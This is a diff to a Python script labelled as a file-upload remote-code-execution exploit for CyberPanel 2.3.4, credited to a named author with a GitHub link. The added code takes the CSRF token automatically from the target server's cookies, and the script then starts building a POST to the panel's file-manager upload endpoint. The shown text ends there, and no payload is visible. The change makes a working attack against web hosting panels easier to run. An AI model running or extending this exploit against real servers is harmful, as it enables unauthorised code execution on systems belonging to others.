@@ -1,8 +1,36 @@
+#!/usr/bin/env python3
+# cyberpanel-2.3.4-file-upload-RCE by Joseph Godwin Kimani
+# This script allows users to upload files to a target server that requires a CSRF token for authentication. It retrieves the CSRF token from the server and uses it to perform a file upload via a multipart/form-data POST request. If the CSRF token cannot be automatically retrieved, the user will be prompted to enter it manually.
+# https://github.com/josephgodwinkimani/cyberpanel-2.3.4-file-upload-RCE
+
 import requests
+
+def get_CSRF_token(target):
+    """Retrieve CSRF token from the target server."""
+    try:
+        response = requests.get(target)
+        response.raise_for_status()  # Raise an error for bad responses
+        
+        # Check if 'csrftoken' is in the cookies
+        if 'csrftoken' in response.cookies:
+            return response.cookies['csrftoken']
+        else:
+            print("CSRF token not found in cookies.")
+            # Prompt user for CSRF token
+            csrf_token = input("Please enter the CSRF token: ")
+            return csrf_token
+    except requests.RequestException as e:
+        print(f"Error retrieving CSRF token: {e}")
+        return None
 
 def upload_file():
     target = input("Enter the target server (e.g., https://panel.domain.com): ")
-    csrf_token = input("Enter the CSRF token: ")
+    
+    # Get CSRF token from the target server
+    csrf_token = get_CSRF_token(target)
+    if csrf_token is None:
+        return  # Exit if CSRF token retrieval failed
+    
     domain_name = input("Enter the domain name (e.g., clientdomain.com): ")    
 
     target_url = f"{target}/filemanager/upload"
